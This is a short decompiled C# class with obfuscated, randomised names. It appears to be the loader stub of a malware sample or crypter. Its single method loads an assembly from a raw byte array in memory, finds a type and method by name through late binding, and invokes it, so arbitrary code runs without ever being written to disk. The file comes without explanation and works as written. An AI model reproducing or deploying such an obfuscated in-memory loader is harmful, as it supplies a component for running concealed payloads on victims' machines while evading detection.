using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class zrPJvtgVvkjTHZT
{
	public static void pmahSJbRVuVe(string nftxsCTYstPDe, string amhjjrYHZYnOYFc, byte[] KphcBfapFk, object[] ZxIBaTCINOX)
	{
		object type = Assembly.Load(KphcBfapFk).GetType(nftxsCTYstPDe);
		if (!Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(type, (object)null, false))))
		{
			return;
		}
		object[] array = new object[1] { amhjjrYHZYnOYFc };
		object[] array2 = array;
		bool[] array3 = new bool[1] { true };
		object obj = NewLateBinding.LateGet(type, (Type)null, "GetMethod", array2, (string[])null, (Type[])null, array3);
		if (array3[0])
		{
			amhjjrYHZYnOYFc = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
		}
		object objectValue = RuntimeHelpers.GetObjectValue(obj);
		if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(objectValue, (object)null, false))))
		{
			object[] array4 = new object[2] { null, ZxIBaTCINOX };
			object[] array5 = array4;
			array3 = new bool[2] { false, true };
			NewLateBinding.LateCall(objectValue, (Type)null, "Invoke", array5, (string[])null, (Type[])null, array3, true);
			if (array3[1])
			{
				ZxIBaTCINOX = (object[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[1]), typeof(object[]));
			}
		}
	}
}
